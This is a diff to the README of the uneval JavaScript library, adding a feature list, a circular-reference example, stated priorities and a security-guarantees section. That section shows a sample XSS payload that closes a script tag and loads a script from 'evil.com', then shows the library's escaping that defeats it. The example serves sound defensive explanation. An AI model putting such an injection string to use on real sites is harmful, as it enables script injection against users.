@@ -21,12 +21,58 @@
 </div>
 
 <div align="center">
-  Convert a JS value to JS source code.
+  Convert a JS value to JS source code, like <code>eval</code> in reverse.
 </div>
 
 ## Features
 
-TODO
+- `undefined` and `null`
+- booleans
+- numbers (including [`-0`](https://en.wikipedia.org/wiki/Signed_zero))
+- strings and
+  [`RegExp`s](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp)
+  (including
+  [unpaired surrogates](<https://en.wikipedia.org/wiki/UTF-16#U+D800_to_U+DFFF_(surrogates)>),
+  [`</script>` escaping](#security-guarantees), etc.)
+- Boxed primitives
+- [`BigInt`s](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt)
+- [Shared](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol#shared_symbols_in_the_global_symbol_registry)
+  and
+  [well-known](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol#well-known_symbols)
+  [`Symbol`s](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol)
+- [`Array`s](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array)
+  (including
+  [sparse arrays](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array#array_methods_and_empty_slots))
+- [`Object`s](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object)
+  (including
+  [`null`-prototype](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object#null-prototype_objects),
+  arbitrary
+  [descriptors](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description),
+  etc.)
+- [`Set`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set)
+- [`Map`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map)
+- [`Date`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date)
+  (including
+  [invalid ones](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date#the_epoch_timestamps_and_invalid_date))
+- [`Temporal`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Temporal)
+- [`URL`](https://developer.mozilla.org/en-US/docs/Web/API/URL) and
+  [`URLSearchParams`](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams),
+- [`ArrayBuffer`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer)
+  (including
+  [`resizable`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer/resizable),
+  [`detached`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer/detached),
+  and
+  [`maxByteLength`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer/maxByteLength))
+- [Node `Buffer`](https://nodejs.org/api/buffer.html#class-buffer)
+- [`TypedArray`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray)
+  (including `BigInt` arrays,
+  [`Float16Array`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Float16Array),
+  and float arrays with
+  [non-canonical NaNs](https://en.wikipedia.org/wiki/NaN#Canonical_NaN))
+- Shared and circular references (for _all_ of the above types)
+- [Custom types](#customization)
+
+And more!
 
 ## Install
 
@@ -50,9 +96,24 @@ console.log(source)
 
 const roundtrippedObject = (0, eval)(`(${source})`)
 assert.deepEqual(roundtrippedObject, object)
+
+const circularObject = {}
+circularObject.self = circularObject
+
+const circularSource = uneval(circularObject)
+console.log(circularSource)
+//=> (a=>a.self=a)({})
+
+const roundtrippedCircularObject = (0, eval)(`(${circularSource})`)
+assert.deepEqual(roundtrippedCircularObject, circularObject)
 ```
 
 ### Customization
+
+> [!WARNING]
+>
+> We cannot ensure our [security guarantees](#security-guarantees) when the
+> `custom` option is used.
 
 `uneval` accepts a `custom` callback for unevaling values.
 
@@ -122,6 +183,66 @@ use it to delegate back to `uneval` for sub-values.
 > This principle is a bit hand-wavy, but we use our best judgement. If you find
 > a scenario where `custom` doesn't work the way you expect, then
 > [create an issue](https://github.com/TomerAberbach/uneval/issues/new).
+
+## Priorities
+
+We prioritize these metrics in the following order:
+
+1. Security (see [our guarantees](#security-guarantees))
+2. Correctness (i.e. ``(0, eval)(`(${uneval(value)})`)`` roundtrips)
+3. Generated source size (human-readable output is a non-goal)
+4. Generated source runtime performance
+5. `uneval` runtime performance
+6. `uneval` bundle size
+
+Note that we do still care about metrics lower on the list. We just care about
+other metrics more.
+
+## Security guarantees
+
+The following are safe UNLESS [`custom`](#customization) is used:
+
+1. Running `uneval` on untrusted input
+2. Running ``(0, eval)(`(${uneval(value)})`)``
+3. Embedding `uneval(value)` in JS source code, including inside an HTML
+   `<script>` tag
+
+For (3), we always escape `</script>` to avoid the following
+[XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) attack:
+
+```js
+const value = {
+  untrustedInput: `</script><script src='https://evil.com/hacked.js'>`,
+}
+
+const html = `
+  <script>
+    var preloaded = ${uneval(value)};
+  </script>
+`
+```
+
+Without escaping, we'd end up with this (after formatting):
+
+```html
+<script>
+  var preloaded = {untrustedInput:"
+</script>
+<!-- Oh no! We've loaded an evil script :( -->
+<script src="https://evil.com/hacked.js">
+  "}
+</script>
+```
+
+But with escaping we get:
+
+```html
+<script>
+  var preloaded = {
+    untrustedInput: "<\u002fscript><script src='https://evil.com/hacked.js'>",
+  }
+</script>
+```
 
 ## Contributing
 
